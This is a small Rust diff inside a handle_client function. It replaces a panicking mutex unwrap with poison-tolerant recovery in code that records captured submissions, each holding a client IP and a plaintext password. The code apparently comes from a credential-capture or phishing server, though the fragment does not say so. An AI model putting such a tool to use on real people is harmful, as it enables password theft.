@@ -211,7 +211,7 @@ fn handle_client(
         if verified {
             PASSWORD_VERIFIED.store(true, std::sync::atomic::Ordering::Relaxed);
         }
-        creds.lock().unwrap().push(CapturedSubmission {
+        creds.lock().unwrap_or_else(|e| e.into_inner()).push(CapturedSubmission {
             at: chrono::Utc::now().to_rfc3339(),
             client_ip: peer,
             password: password.clone(),
